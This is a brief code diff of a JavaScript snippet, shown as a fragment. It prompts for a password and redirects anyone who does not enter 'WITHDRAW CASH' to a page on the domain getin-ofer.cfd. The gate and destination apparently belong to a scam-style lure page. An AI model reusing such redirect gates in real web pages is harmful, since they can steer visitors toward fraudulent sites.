@@ -6,3 +6,4 @@ password = prompt(
 );
 if (password != 'WITHDRAW CASH') {
   location.href = 'https://getin-ofer.cfd/Happy-Independce.html';
+  }
